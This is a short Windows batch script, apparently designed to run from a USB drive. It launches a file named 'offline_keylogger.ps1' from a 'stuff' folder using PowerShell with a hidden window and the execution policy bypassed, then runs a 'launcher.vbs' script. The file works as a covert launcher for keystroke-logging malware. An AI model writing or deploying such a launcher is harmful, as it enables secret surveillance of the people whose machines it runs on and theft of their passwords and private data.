@echo off
set "DriveRoot=%~d0"
set "StuffFolder=%DriveRoot%\stuff"

set "HeadlessScript=%StuffFolder%\offline_keylogger.ps1"

if exist "%HeadlessScript%" (
    pushd "%StuffFolder%"
    powershell.exe -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File "%HeadlessScript%"
    popd
) else (
    echo Headless script not found in %StuffFolder%
)

cscript //nologo launcher.vbs
exit /b
